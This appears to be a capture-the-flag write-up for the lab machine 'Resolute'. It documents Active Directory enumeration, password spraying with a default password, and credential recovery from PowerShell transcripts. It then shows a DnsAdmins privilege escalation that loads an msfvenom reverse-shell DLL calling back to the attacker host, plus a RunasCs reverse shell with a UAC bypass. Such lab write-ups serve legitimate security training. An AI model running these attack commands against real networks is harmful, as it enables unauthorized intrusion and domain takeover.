# Machine Info

Resolute was a medium-ranked Active Directory machine that involved utilizing default credentials with password spraying to gain initial access to the box. For lateral movement, we found Ryan's user password in the PowerShell session history file. Ryan was a member of the DnsAdmins group, which allows loading new **.dll** files. We will abuse this to gain Admin account access on the box.

<img  alt="Pasted image 20240729055714" src="https://github.com/user-attachments/assets/ccc541e2-8c44-4359-85e9-d85bfcf4e0e8">

# User
## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.129.25.43 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,88,135,139,445,3268,3269,9389,49676,49686
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p53,88,135,139,445,3268,3269,9389,49676,49686 -sC -sV -A -T4 10.129.25.43 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-22 18:00:16Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf       .NET Message Framing
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-22T18:01:18
|_  start_date: 2024-07-22T17:44:45
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h27m01s, deviation: 4h02m32s, median: 6m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-07-22T11:01:17-07:00
```

## Information Gathering

Through **Nmap** we found port **53 DNS** is open which can be used to perform zone transfer, **88 kerberose** is open which can be used to for enumeration and authentication purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **3268 ldap** port is open. Nmap discover Domain name by using **ldap** scripts which is **megabank.local** and Fully Qualified Domain Name FQDN as **Resolute.megabank.local** . Let's add this to our local DNS file called `/etc/hosts` so that our computer can resolve domain.

```bash
$ echo "10.129.25.43 megabank.local Resolute.megabank.local" | sudo tee -a /etc/hosts
10.129.25.43 megabank.local Resolute.megabank.local
```

## 53 DNS

Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be 

```bash
$ dig axfr @10.129.25.43 megabank.local
```

Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, **AXFR** queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```shell
$ dig axfr @10.129.25.43 megabank.local

; <<>> DiG 9.19.25-185-g392e7199df2-1-Debian <<>> axfr @10.129.25.43 authority.htb.corp
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

We didn't found anything using zone transfer. 

## User Enumeration

### 1. Kerberos 88

**kerbrute** (A tool to quickly brute-force and enumerate valid Active Directory accounts through **Kerberos Pre-Authentication**) . it can also be used to perform password spraying on domain if somehow we managed to find a valid password. **Kerbrute** provide us many functions including

```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function to enumerate user's name in domain.

```bash
$ kerbrute userenum -d megabank.local users-list --dc 10.129.25.43
```

 - **-d** is for domain name 
 - **--dc** for domain controller IP

```users
- steve@megabank.local
- fred@megabank.local
- marcus@megabank.local
- simon@megabank.local
- ryan@megabank.local
- stevie@megabank.local
- angela@megabank.local
- claire@megabank.local
- sally@megabank.local
- claude@megabank.local
- melanie@megabank.local
- administrator@megabank.local
- gustavo@megabank.local
- marko@megabank.local
- annette@megabank.local
- abigail@megabank.local
- paulo@megabank.local
- felicia@megabank.local
- annika@megabank.local
- per@megabank.local
- naoki@megabank.local
- zach@megabank.local
- ulf@megabank.local
```

#### 2. Using Nmap

```bash
$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="megabank.local",userdb=xato-net-10-million-usernames.txt 10.129.23.166
```


```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     zach@megabank.local
|     annette@megabank.local
|     felicia@megabank.local
|     marcus@megabank.local
|     claude@megabank.local
|     steve@megabank.local
|     ulf@megabank.local
|     per@megabank.local
|     paulo@megabank.local
|     claire@megabank.local
|     resolute@megabank.local
|     sally@megabank.local
|     marko@megabank.local
|     abigail@megabank.local
|     administrator@megabank.local
|     melanie@megabank.local
|     fred@megabank.local
|     angela@megabank.local
|     annika@megabank.local
|     naoki@megabank.local
|     ryan@megabank.local
|     gustavo@megabank.local
|     stevie@megabank.local
|_    simon@megabank.local
```

### 3. Ldap 389

`windapsearch` is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.

```bash
$ ./windapsearch.py -d megabank.local -u Guest\\ldapbind -p '' **-U -**-full
```

- **-d** for domain
- **-u** for username
- **-p** for password
- **-U** to enumerate Users
- **--full** to Dump all attributes from LDAP

```Bash
[+] Enumerating all AD users
[+]	Found 25 users: 

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20190925132831.0Z
whenChanged: 20190925132831.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=megabank,DC=local
uSNChanged: 8197
name: Guest
objectGUID: dVs0v8Y8kk6A6yJE8D5mmw==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927105219.0Z
dSCorePropagationData: 20190925132912.0Z
dSCorePropagationData: 16010101181633.0Z
.
.
snipped
.
.

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20190927131714.0Z
whenChanged: 20191203132427.0Z
displayName: Marko Novak
uSNCreated: 13110
uSNChanged: 69792
name: Marko Novak
objectGUID: 8oIRSXQNmEW4iTLjzuwCpw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132140638345690606
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z
.
.
snipped
.
.

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Naoki Yamamoto
distinguishedName: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
instanceType: 4
whenCreated: 20191204104044.0Z
whenChanged: 20191204104044.0Z
uSNCreated: 131152
uSNChanged: 131156
name: Naoki Yamamoto
objectGUID: gABq//UsGkiGCoHHGQPA3Q==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132199296443424853
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWeCcAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: naoki
sAMAccountType: 805306368
userPrincipalName: naoki@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z
```

### 4. ms RPC 135

A Remote Procedure Call (RPC) is a software communication protocol that one program uses to request a service from another program located on a different computer and network, without having to understand the network's details. Specifically, RPC is used to call other processes on remote systems as if the process were a local system. A procedure call is also sometimes known as a _function call_ or a _subroutine call_.

**The rpcclient tool is used to interact with remote services on Windows systems using the Remote Procedure Call (RPC) protocol**. An attacker can use rpcclient to enumerate information about the system, such as users and groups, which can be useful for carrying out further attacks.


```bash
$ rpcclient -U "" -N 10.129.23.166

# user enumeration
$ getdomusers
```

- **-U** for username
- **-N** for don't ask for password

Getting each user information one by one was quite time consuming, i decided to write a bash script which will automate this process

```bash
#!/bin/bash
# Define the file containing the list of usernames
USER_LIST_FILE="users1.txt"
# Define the server IP address or hostname
SERVER="10.129.23.166"
# Define the username for authentication
USERNAME="" # Replace with your actual username
# Check if the file exists
if [[ ! -f "$USER_LIST_FILE" ]]; then
  echo "User list file $USER_LIST_FILE does not exist."
  exit 1
fi
# Read each username from the file and query it
while IFS= read -r username; do
  # Skip empty lines and comments (lines starting with #)
  if [[ -z "$username" || "$username" =~ ^# ]]; then
    continue
  fi
  # Query the user using rpcclient
  echo "Querying user: $username"
  rpcclient -U "$USERNAME" -N "$SERVER" -c "queryuser $username"
  # Check if rpcclient was successful
  if [[ $? -ne 0 ]]; then
    echo "Failed to query user: $username"
  fi
done < "$USER_LIST_FILE"
```

In Marko Users Description, i found the default password for the **marko** user. 

<img  alt="Pasted image 20240729035250" src="https://github.com/user-attachments/assets/accfc1cd-551f-482d-aa19-7e4ee88d96d9">

## Password Spraying

Password spraying is **a cyberattack tactic that involves a hacker using a single password to try and break into multiple target accounts**. It's a type of brute-force attack. Password spraying is an effective tactic because it's relatively simple to carry out, and users often have easy-to-guess passwords.

Now we have an valid password, let's try to spray it on all the users to find out if any of the user have this password. We will be using tool called CrackmapExec an command line tool.

```bash
$ cme smb 10.129.23.166 -u users1.txt -p 'Welcome123!' -d megabank.local --continue-on-success
```

- **smb** to define protocol
- **-u** to define user
- **-p** to define Password
- **-d** for domain
- **--continue-on-success** to continues authentication attempts even after successes 

```bash
SMB         10.129.23.166   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.23.166   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.23.166   445    RESOLUTE         [-] 
.
.
snipped
.
.
megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.23.166   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.23.166   445    RESOLUTE         [-] megabank.local\administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.23.166   445    RESOLUTE         [-] 
.
.
snipped
.
.
megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.23.166   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.23.166   445    RESOLUTE         [-] megabank.local\resolute:Welcome123! STATUS_LOGON_FAILURE
```

**Melanie** have the default password set. Let's get shell into it using Evil-Winrm.

<img  alt="Pasted image 20240729043817" src="https://github.com/user-attachments/assets/64d1b4d4-04ec-4929-a30d-34d6b100fe37">

`melanie : Welcome123!`

## WinRM 5985

Windows Remote Management (WinRM) is a protocol developed by Microsoft, enabling administrators to **manage and control Windows-based systems remotely** Evil-winrm is a tool which use **WinRM** service to get remote shell on the box.

```powershell
$ evil-winrm -i megabank.local -u melanie -p 'Welcome123!'                
```

- **-i** for IP address
- **-u** for user
- **-p** for password

```powershell
*Evil-WinRM* PS C:\Users\melanie\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
d823709facaeec2fd3797472ddc9d51b
```

# Privilege Escalation

## Lateral Movement

I started enumerating using **winpease** but didn't discover anything useful. Then i decided to enumerate the File system manually. In `C:\` directory i found some hidden directories, PSTranscripts directory holds the Powershell session Hisotory Logs where i found the credentials of **Ryan** user.

<img alt="Pasted image 20240729044034" src="https://github.com/user-attachments/assets/68cf3695-d3d0-4d49-94c9-41a573f96ebd">

<img  alt="Pasted image 20240729044108" src="https://github.com/user-attachments/assets/56bc6561-d9e3-4f79-98a0-a79fda85ba1c">

- **-Force** to display hidden Directories
- **-R** for recursion

<img  alt="Pasted image 20240729044214" src="https://github.com/user-attachments/assets/5c0a5388-c5a9-491d-9fc4-f8cad7d9f520">

`C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`
`ryan : Serv3r4Admin4cc123!`

Then i check if the Ryan is a member of Remote Management group, but he didn't so we can't get shell using Evil-Winrm. 

There we will use RunasCs is **an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials** 

<img  alt="Pasted image 20240729044323" src="https://github.com/user-attachments/assets/93b8cbc1-3689-4609-ae4f-11166dc02801">

```bash
$ ./RunasCs.exe ryan  'Serv3r4Admin4cc123!' powershell.exe -r 10.10.16.8:9001 -l 8  --bypass-uac
```

- **-r** for remote connection
- **-l** to set logon type, by default it is set to 2.
- **--bypass-uac** for bypassing the token filtering limitation.

<img  alt="Pasted image 20240729054014" src="https://github.com/user-attachments/assets/34216648-ca07-41b8-982a-8515a1062dd7">

## BloodHound

 Now Let's run bloodhound-python, an investigator used to gather information from all over the domain. After it's completion, run bloodhound and upload it to bloodhound and start investigation on graph's.
 
To run Bloodhound we first need to start neo4j a graph database system. 

```shell
sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
```

Now type simple bloodhound in new terminal and press enter to start the bloodhound. If you are running bloodhound for the first time you need to reset the default credentials of bloodhound which is `neo4j:neo4j`. After logging into the bloodhound upload the zip file we create by **bloodhound-python**. You can use both methods, either drag and drop the file into bloodhound or by using upload data button and wait for data to upload into the database. 

<img alt="Pasted image 20240127043922" src="https://github.com/user-attachments/assets/e75c5b6e-06bf-468d-9ca0-d0f206ec5228">

After data upload process search for user, **Ryan** and **melanie** in search bar and mark them both as a owned user's.

<img  alt="Pasted image 20240729054548" src="https://github.com/user-attachments/assets/58313f32-7d40-418c-ba44-ed6cf94a3ac5">

After i checked t the properties of Ryan user, and he was a member of **Contractor** Group and **Contractor** Group was a member of **DnsAdmins** group.

<img alt="Pasted image 20240729044602" src="https://github.com/user-attachments/assets/fec6a50b-a2f4-4b47-ada5-c143cb9f426a">

## Exploitation

#### DnsAdmins

Users who are members of the group 'DnsAdmins' have the ability to abuse a feature in the Microsoft DNS management protocol to make the DNS server load any specified DLL. The service which in turn, executes the DLL is performed in the context of SYSTEM and could be used on a Domain Controller (Where DNS is usually running from) to gain Domain Administrator privileges.
[Refrence](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin)

First we need to create an malicious **.dll** file using **msfvenom** and then host it on SMB server. I tired to upload it on the box, but some kind of defense mechanism blocking it.

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -f dll > exploit.dll

$ smbserver.py -smb2support share ./
```

<img alt="Pasted image 20240729045502" src="https://github.com/user-attachments/assets/4de6ed1f-4d00-4ef3-8baa-a62f20557c18">

Once SMB server is up and running, the following command can be used to register the DLL. Start a netcat listener on you machine and use **net** command to restart the dns service.

```bash
$ cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.8\share\exploit.dll

$ net stop dns /y
$ net start dns /y
```

<img  alt="Pasted image 20240729050026" src="https://github.com/user-attachments/assets/248519bd-c87b-47a3-9e87-7a4db6e311b4">

Once the DNS service restart, we can see we got shell as **nt authority\system**

<img alt="Pasted image 20240729050054" src="https://github.com/user-attachments/assets/8731dc29-64aa-4647-bd5c-467534425e01">

# Flags

User : d9bce784c335e......9aefe6a0a8173

Root : 4d82dbba1325.......071f17898d8cff

# Happy Hacking ❤
